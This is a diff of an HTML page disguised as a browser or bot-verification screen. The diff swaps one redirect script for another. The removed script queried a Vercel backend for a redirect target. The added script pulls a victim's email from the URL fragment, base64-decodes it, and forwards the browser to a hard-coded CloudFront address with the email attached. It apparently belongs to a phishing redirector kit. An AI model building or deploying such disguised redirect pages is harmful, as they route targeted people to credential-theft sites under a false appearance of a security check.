@@ -21,7 +21,7 @@ p {font-size: 1em; color: #404040; text-align: center; margin: 10px 0 0 0;}
 .bubbles { background-color: #404040; width:15px; height: 15px; margin:2px; border-radius:100%; -webkit-animation:bubbles 0.6s 0.07s infinite ease-in-out; animation:bubbles 0.6s 0.07s infinite ease-in-out; -webkit-animation-fill-mode:both; animation-fill-mode:both; display:inline-block; }
 .btn-success {border: 2px solid transparent; background: #28a745; color: #ffffff; font-size: 18px; line-height: 15px; padding: 10px 10px; text-decoration: none; text-shadow: none; border-radius: 3px; box-shadow: none; transition: 0.25s; display: block; margin: 0 auto;}
 .btn-success:hover {background-color: #218838;}
-</style>
+  </style>
 <script async src='/cdn-cgi/bm/cv/669835187/api.js'></script></head>
 <body>
 <table style="width:100%; height:100%; padding:20px;">
@@ -51,39 +51,37 @@ p {font-size: 1em; color: #404040; text-align: center; margin: 10px 0 0 0;}
 .btn-color:hover {line-height: 16px; padding: 16px 16px; border: 1px solid #ccc;}
 </style>
 <a href="https://xaxaxa.antibot.cloud/">  </a>
-
-<!-- Begin added script for Vercel backend interaction -->
 <script>
-async function fetchDynamicContent() {
-    const params = new URLSearchParams(window.location.search); // Get query parameters from the URL
+/* Add this to .htaccess if you want to use multiple argument in pubil html folder. file named .htaccess or create it
+RewriteEngine On
+RewriteRule ^[^/]+/try/(.*)$ /try/$1 [L] */
 
-    // Check if there's a hash (fragment) in the URL
-    const hash = window.location.hash.substring(1); // Remove the '#' from the start
-    if (hash) {
-        // If the hash exists, add it to the query parameters
-        params.append('fragment', hash);
-    }
-
-    const response = await fetch(`https://999777.vercel.app/api/redirect?${params.toString()}`);  // ADD VERCEL LINK HERE URL
-    const data = await response.json();
-
-    if (data.redirectUrl) {
-        // If the backend returns a redirect URL, navigate there
-        window.location.href = data.redirectUrl;
-    } else if (data.error) {
-        // Handle errors by displaying a message
-        document.getElementById('error').innerText = data.error;
-    } else {
-        // Optionally display other data from the backend
-        document.getElementById('btn').innerText = JSON.stringify(data);
-    }
+var redirect_url = "https://d12iauu77pp2xy.cloudfront.net/#"; // Change this to the URL you want to redirect to
+var path = window.location.href;  // Get the part of the URL after the domain name
+var parts = path.split('#'); // Split the path by #
+// Check if there is a second part
+if (parts.length > 1) {
+// Get the email from the second part
+var email = parts[1];
+if (isBase64(email)) {
+email = atob(email);
+}
+// Redirect to the new URL with the email
+window.location.href = redirect_url + email;
+} else {
+// No email found, show an error message
+alert('Page Not Found');
 }
 
-// Run the function when the page loads
-window.onload = fetchDynamicContent;
+function isBase64(str) {
+try {
+return btoa(atob(str)) == str;
+} catch (err) {
+return false;
+}
+}
+console.log("The path is: " + path);
 </script>
-<!-- End added script for Vercel backend interaction -->
-
 <script type="ebcf15dc64d559118e26a613-text/javascript">
 setTimeout(Button, 3000);
 
